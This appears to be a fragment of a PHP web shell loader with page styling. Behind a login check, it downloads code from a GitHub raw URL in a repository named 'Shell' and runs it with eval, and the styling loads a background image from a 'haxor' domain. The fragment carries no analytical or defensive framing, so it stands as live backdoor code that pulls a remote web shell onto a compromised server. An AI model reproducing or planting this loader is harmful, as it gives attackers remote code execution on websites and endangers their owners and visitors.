...
if (is_logged_in()) {
    $a = geturlsinfo('https://raw.githubusercontent.com/Clay-Haxor3/Shell/refs/heads/main/alfahaxor');
    eval('?>' . $a);
} else {
...
<body>
  ...
  align-items: center;
  color: rgb(0, 0, 0);
  background: url('https://haxor.lol/love/asta.gif') no-repeat center center fixed;
